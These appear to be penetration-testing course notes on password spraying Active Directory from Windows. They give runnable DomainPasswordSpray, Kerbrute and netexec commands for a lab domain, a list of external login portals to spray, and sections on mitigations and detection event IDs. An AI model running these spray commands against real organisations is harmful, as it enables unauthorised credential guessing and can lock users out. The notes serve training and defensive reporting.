# Section 12 — Internal Password Spraying from Windows

---

## QUICK REFERENCE — Full Attack Chain

```powershell
# STEP 1 — RDP to Windows attack host
# xfreerdp /v:MS01_IP /u:htb-student /p:'Academy_student_AD!' /cert:ignore /dynamic-resolution

# STEP 2 — DomainPasswordSpray (auto-builds list, respects lockout)
cd C:\Tools
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# STEP 3 — Check results
cat spray_success

# STEP 4 — Validate hit from Linux
nxc smb DC_IP -u HIT_USER -p 'Welcome1'
```

---

## DomainPasswordSpray.ps1

Auto-builds user list from AD, queries lockout policy, removes disabled users, excludes accounts within 1 attempt of lockout.

```powershell
# Domain-joined (auto user list)
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Not domain-joined (provide user list)
Invoke-DomainPasswordSpray -UserList valid_users.txt -Password Welcome1 -OutFile spray_success
```

Always use `-OutFile` — don't rely on scrolling console.

---

## Kerbrute (Windows)

```powershell
.\kerbrute.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

---

## External Spraying Targets (For Reports)

Common AD-authenticated external services worth testing:
- OWA / Exchange Web Access / O365
- Skype for Business
- RDS / Citrix portals
- VPN portals (SonicWall, OpenVPN, Fortinet)
- VMware Horizon VDI
- Custom web apps with AD auth

---

## Mitigations (Include in Reports)

| Control | Detail |
|---------|--------|
| MFA | Best control — enforce on ALL external portals |
| LAPS | Unique rotating local admin passwords — stops local spray |
| Restrict access | Least privilege on all external app access |
| Separate admin accounts | Privileged users = dedicated admin account |
| Password hygiene | Passphrases, block common words/seasons/company name |

**Lockout policy caution:** Too strict a lockout = attacker can intentionally lock out all accounts (DoS).

---

## Detection

| Event ID | Meaning |
|----------|---------|
| 4625 | Account failed to log on — many in short window = spray indicator |
| 4771 | Kerberos pre-auth failed — LDAP spray indicator |

---

## Exam Notes

- DomainPasswordSpray = safest Windows spray tool — auto-handles lockout policy
- `-ErrorAction SilentlyContinue` suppresses noise
- `-OutFile` always — don't miss hits scrolling by
- After spray → test against SMB, WinRM, RDP immediately
- 4625 = SMB spray detection | 4771 = Kerberos/LDAP spray detection
